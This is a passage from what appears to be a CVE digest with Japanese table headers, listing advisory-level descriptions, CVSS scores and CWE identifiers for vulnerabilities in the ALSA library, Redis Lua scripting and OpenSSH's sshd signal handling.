| Weaknesses | `CWE-415` |
| Published | 2026-06-22T18:16:48.557 |

The Advanced Linux Sound Architecture (ALSA) library before 1.2.16.1 contains a double-free vulnerability in parse_def() in src/conf.c that allows attackers to corrupt memory by supplying maliciously crafted ALSA configuration text. When parsing nested compound or array configuration blocks, parse_def() fails to check return values before continuing, causing snd_config_delete() to be called twice on the same already-freed node, resulting in a NULL-pointer write or invalid memory read.

### CVE-2024-31449

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20;CWE-121` |
| Published | 2024-10-07T19:51:08.775Z |

Redis is an open source, in-memory database that persists on disk. An authenticated user may use a specially crafted Lua script to trigger a stack buffer overflow in the bit library, which may potentially lead to remote code execution. The problem exists in all versions of Redis with Lua scripting. This problem has been fixed in Redis versions 6.2.16, 7.2.6, and 7.4.1. Users are advised to upgrade. There are no known workarounds for this vulnerability.

### CVE-2024-6409

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H` |
| Weaknesses | `CWE-364` |
| Published | 2024-07-08T17:57:10.517Z |

A race condition vulnerability was discovered in how signals are handled by OpenSSH's server (sshd). If a remote attacker does not authenticate within a set time period, then sshd's SIGALRM handler is called asynchronously. However, this signal handler calls various functions that are not async-signal-safe, for example, syslog(). As a consequence of a successful attack, in the worst case scenario, an attacker may be able to perform a remote code execution (RCE) as an unprivileged user running the sshd server.
